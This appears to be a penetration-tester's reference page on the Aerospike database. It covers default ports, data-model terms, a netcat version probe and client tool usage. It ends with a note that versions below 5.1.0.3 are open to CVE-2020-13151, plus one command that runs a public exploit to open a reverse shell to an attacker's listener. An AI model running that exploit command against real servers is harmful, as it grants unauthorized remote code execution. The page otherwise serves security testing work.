---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Aerospike

## 101

**Aerospike** is a fast, NoSQL key-value store used in real-time appsâ€”think session storage, user profiles, ad tech, etc. You might encounter it in environments that value _speed over complexity_, often with large-scale deployments.

<table><thead><tr><th width="176.99993896484375">Port</th><th width="208.66668701171875">Protocol</th><th>Description</th></tr></thead><tbody><tr><td><code>3000</code></td><td>TCP</td><td>Client access (main DB port)</td></tr><tr><td><code>3001</code></td><td>TCP</td><td>Internal fabric (cluster communication)</td></tr><tr><td><code>3002</code></td><td>TCP</td><td>Heartbeat (node monitoring)</td></tr><tr><td><code>3003</code></td><td>TCP</td><td>Info (optional; monitoring/statistics)</td></tr><tr><td><code>3004-3005</code></td><td>TCP</td><td>TLS equivalents of above (if enabled)</td></tr></tbody></table>

<table><thead><tr><th width="121.00006103515625">Aerospike</th><th width="98.6666259765625">RDBMS </th><th>Description</th></tr></thead><tbody><tr><td>Namespace</td><td>Database</td><td>Top-level data container. Configured with storage engine, replication, TTL, etc.</td></tr><tr><td>Set</td><td>Table</td><td>Logical grouping of records within a namespace; a table without enforced schema.</td></tr><tr><td>Record</td><td>Row</td><td>A single data entry identified by a key.</td></tr><tr><td>Bin</td><td>Column</td><td>Key-value pair inside a record.</td></tr></tbody></table>

## Manual Probe

```bash
$ nc -nv 192.168.X.143 3003
(UNKNOWN) [192.168.X.143] 3003 (?) open
help
...
namespace;truncate-namespace-undo;truncate-undo;version;
version
Aerospike Community Edition build 5.1.0.1
```

## Usage

{% tabs %}
{% tab title="aql" %}
To interact the **`aql`** (Aerospike Query Language) utility can be used:

```bash
aql -h <host> -p 3000
```

Once connected, basic commands look like:

```sql
show namespaces;
show sets;
select * from <namespace>.<set>;
```
{% endtab %}

{% tab title="asadm" %}
For deeper inspection/admin tasks the Admin Tool (`asadm`) can be used:

```bash
asadm -h <host> -p 3000
```
{% endtab %}
{% endtabs %}

## Versions

### < 5.1.0.3

Vulnerable to[ CVE-2020-13151](https://nvd.nist.gov/vuln/detail/CVE-2020-13151) with a [PoC](https://github.com/b4ny4n/CVE-2020-13151) available.

```bash
$ ./cve2020-13151.py --ahost aero --pythonshell --lhost=192.168.X.154 --lport=80
```
